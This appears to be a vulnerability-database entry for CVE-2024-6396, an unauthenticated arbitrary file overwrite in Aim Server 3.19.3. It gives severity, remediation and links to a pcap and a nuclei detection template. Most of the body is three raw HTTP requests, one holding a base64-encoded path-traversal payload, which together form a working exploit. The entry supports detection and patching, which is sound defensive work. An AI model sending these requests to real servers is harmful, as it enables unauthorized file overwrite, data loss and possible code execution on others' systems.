---
layout: "post"
cve_id: "CVE-2024-6396"
title: "Aimhubio Aim Server 3.19.3 - Arbitrary File Overwrite"
pcap: true
pcap_path: "/pcaps/2024/CVE-2024-6396.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-6396.yaml"
author: "iamnoooob,rootxharsh,pdresearch"
severity: "critical"
impact: "Unauthenticated attackers can overwrite arbitrary files on the host server and exfiltrate data by manipulating the _backup_run function parameters, potentially achieving denial of service, data loss, or remote code execution.
"
remediation: "Update Aimhubio Aim to version 3.19.4 or later to address the arbitrary file overwrite vulnerability.
"
classification: "{'cvss-metrics': 'CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', 'cvss-score': 9.8, 'cve-id': 'CVE-2024-6396', 'cwe-id': 'CWE-29', 'epss-score': 0.9083, 'epss-percentile': 0.99604, 'cpe': 'cpe:2.3:a:aimstack:aim:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 3, 'verified': True, 'fofa-query': 'icon_hash="-1047157256"', 'product': 'aim', 'vendor': 'aimstack'}"
tags:
  - "cve"
  - "cve2024"
  - "aim"
  - "aimhubio"
  - "file-write"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
A vulnerability in the `_backup_run` function in aimhubio/aim version 3.19.3 allows remote attackers to overwrite any file on the host server and exfiltrate arbitrary data. The vulnerability arises due to improper handling of the `run_hash` and `repo.path` parameters, which can be manipulated to create and write to arbitrary file paths. This can lead to denial of service by overwriting critical system files, loss of private data, and potential remote code execution.


## üåê HTTP Request
```nohighlight
POST /tracking/client_1/get-resource HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.19
Connection: close
Content-Length: 94
Content-Type: application/json
Accept-Encoding: gzip

{
"resource_handler": "my_resource",
"resource_type": "Repo",
"args": "AAAAAAABAAAABw=="
}
```

```nohighlight
POST /tracking/client_1/read-instruction HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15
Connection: close
Content-Length: 223
Content-Type: application/json
Accept-Encoding: gzip

{
"resource_handler": "my_resource",
"method_name": "_backup_run",
"args": "AAAAAAABAAAABgoAAAD+AAAAAAAAAAD+AEsAAAAELi4vLi4vLi4vLi4vdXNyL2xvY2FsL2xpYi9weXRob24zLjkvc2l0ZS1wYWNrYWdlcy9haW1fdWkvYnVpbGQvT3NnZUMycy50eHQ="
}
```

```nohighlight
GET /static-files/ViqpRTQx.txt HTTP/1.1
Host: www.victim.com:43800
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

